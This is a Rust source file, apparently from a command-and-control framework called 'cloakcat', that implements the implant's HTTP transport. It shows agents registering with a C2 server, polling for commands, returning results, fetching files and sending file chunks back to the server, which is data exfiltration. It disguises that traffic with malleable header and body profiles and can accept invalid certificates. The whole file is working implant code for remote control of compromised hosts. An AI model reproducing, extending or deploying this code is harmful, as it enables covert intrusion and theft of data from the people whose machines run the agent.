//! Transport abstraction for C2 communication.

#[cfg(target_os = "windows")]
pub mod pipe;
#[cfg(target_os = "windows")]
pub use pipe::PipeTransport;

use std::env;

use anyhow::{Context, Result};
use cloakcat_protocol::{FileChunk, ListenerProfile, MalleableProfile, RegisterReq, RegisterResp, ResultReq};
use reqwest::Client;

/// Defines how the agent communicates with the C2 server.
/// Concrete implementations can swap HTTP for DNS, SMB, etc.
#[allow(async_fn_in_trait)]
pub trait Transport {
    /// Register this agent with the server.
    async fn register(&self, url: &str, token: &str, req: &RegisterReq) -> Result<RegisterResp>;

    /// Long-poll for a command. Returns (status_code, body_text).
    async fn poll(&self, url: &str, token: &str) -> Result<(u16, String)>;

    /// Upload a command result.
    async fn send_result(&self, url: &str, token: &str, req: &ResultReq) -> Result<()>;

    /// Fetch assembled file bytes for an upload task.
    async fn fetch_upload_file(&self, url: &str, token: &str) -> Result<Vec<u8>>;

    /// Send a single download chunk to the server.
    async fn send_download_chunk(&self, url: &str, token: &str, chunk: &FileChunk) -> Result<()>;
}

/// HTTP transport backed by reqwest.
pub struct HttpTransport {
    client: Client,
    /// Active malleable profile, if any.  Controls body transforms.
    malleable: Option<MalleableProfile>,
}

impl HttpTransport {
    /// Create from a built-in `ListenerProfile` (no body transforms).
    pub fn new(profile: &dyn ListenerProfile, c2_url: &str) -> Result<Self> {
        Self::build(profile, None, c2_url)
    }

    /// Create from a `MalleableProfile` — sets default headers and activates body transforms.
    pub fn new_malleable(profile: &MalleableProfile, c2_url: &str) -> Result<Self> {
        Self::build(profile, Some(profile.clone()), c2_url)
    }

    fn build(
        profile: &dyn ListenerProfile,
        malleable: Option<MalleableProfile>,
        c2_url: &str,
    ) -> Result<Self> {
        let mut default_headers = reqwest::header::HeaderMap::new();

        // User-Agent (from trait method — covers both built-in and malleable profiles)
        if let Some(ua) = profile.user_agent() {
            default_headers.insert(
                reqwest::header::USER_AGENT,
                reqwest::header::HeaderValue::from_str(ua)
                    .expect("profile user_agent must be a valid header value"),
            );
        }

        // Extra client headers from the malleable profile (skip User-Agent — already set)
        if let Some(ref mp) = malleable {
            for h in &mp.http_get.client.headers {
                if h.name.eq_ignore_ascii_case("user-agent") {
                    continue;
                }
                if let (Ok(name), Ok(val)) = (
                    reqwest::header::HeaderName::from_bytes(h.name.as_bytes()),
                    reqwest::header::HeaderValue::from_str(&h.value),
                ) {
                    default_headers.insert(name, val);
                }
            }
        }

        let mut builder = Client::builder();
        if !default_headers.is_empty() {
            builder = builder.default_headers(default_headers);
        }

        if c2_url.starts_with("https://") {
            let accept_invalid = env::var("AGENT_ACCEPT_INVALID_CERTS").as_deref() == Ok("1");
            builder = builder.danger_accept_invalid_certs(accept_invalid);
        }

        Ok(Self { client: builder.build()?, malleable })
    }

    // ── Internal helpers ─────────────────────────────────────────────────────

    /// Send a POST request, applying the malleable POST body transform if active.
    async fn post_body<T: serde::Serialize>(
        &self,
        url: &str,
        token: &str,
        req: &T,
    ) -> Result<reqwest::Response> {
        let transform = self.malleable.as_ref().map(|mp| &mp.http_post.client.output);

        match transform {
            Some(t) if !t.is_identity() => {
                let raw = serde_json::to_vec(req).context("JSON serialisation failed")?;
                let encoded = t.encode(&raw).context("malleable POST body encode failed")?;
                Ok(self
                    .client
                    .post(url)
                    .header("X-Agent-Token", token)
                    .header("Content-Type", "text/plain")
                    .body(encoded)
                    .send()
                    .await?)
            }
            _ => Ok(self
                .client
                .post(url)
                .header("X-Agent-Token", token)
                .json(req)
                .send()
                .await?),
        }
    }
}

impl Transport for HttpTransport {
    async fn register(&self, url: &str, token: &str, req: &RegisterReq) -> Result<RegisterResp> {
        let resp = self.post_body(url, token, req).await?;
        if !resp.status().is_success() {
            let status = resp.status();
            let text = resp.text().await.unwrap_or_default();
            anyhow::bail!("register failed: status={} body={}", status, text);
        }
        let reg: RegisterResp = resp.json().await?;
        Ok(reg)
    }

    async fn poll(&self, url: &str, token: &str) -> Result<(u16, String)> {
        let resp = self
            .client
            .get(url)
            .header("X-Agent-Token", token)
            .send()
            .await?;
        let status = resp.status().as_u16();
        let text = resp.text().await?;

        // Decode poll response if a non-identity GET server transform is active.
        if let Some(mp) = &self.malleable {
            let transform = &mp.http_get.server.output;
            if !transform.is_identity() && status == 200 {
                let trimmed = text.trim();
                if !trimmed.is_empty() && trimmed != "{}" {
                    let decoded = transform
                        .decode(trimmed)
                        .context("malleable poll response decode failed")?;
                    let decoded_str = String::from_utf8(decoded)
                        .context("decoded poll response is not valid UTF-8")?;
                    return Ok((status, decoded_str));
                }
            }
        }

        Ok((status, text))
    }

    async fn send_result(&self, url: &str, token: &str, req: &ResultReq) -> Result<()> {
        let resp = self.post_body(url, token, req).await?;
        if !resp.status().is_success() {
            let status = resp.status();
            let text = resp.text().await.unwrap_or_default();
            anyhow::bail!("status={} body={}", status, text);
        }
        Ok(())
    }

    async fn fetch_upload_file(&self, url: &str, token: &str) -> Result<Vec<u8>> {
        let resp = self
            .client
            .get(url)
            .header("X-Agent-Token", token)
            .send()
            .await?;
        if !resp.status().is_success() {
            let status = resp.status();
            let text = resp.text().await.unwrap_or_default();
            anyhow::bail!("fetch_upload_file: status={} body={}", status, text);
        }
        Ok(resp.bytes().await?.to_vec())
    }

    async fn send_download_chunk(&self, url: &str, token: &str, chunk: &FileChunk) -> Result<()> {
        let resp = self
            .client
            .post(url)
            .header("X-Agent-Token", token)
            .json(chunk)
            .send()
            .await?;
        if !resp.status().is_success() {
            let status = resp.status();
            let text = resp.text().await.unwrap_or_default();
            anyhow::bail!("send_download_chunk: status={} body={}", status, text);
        }
        Ok(())
    }
}
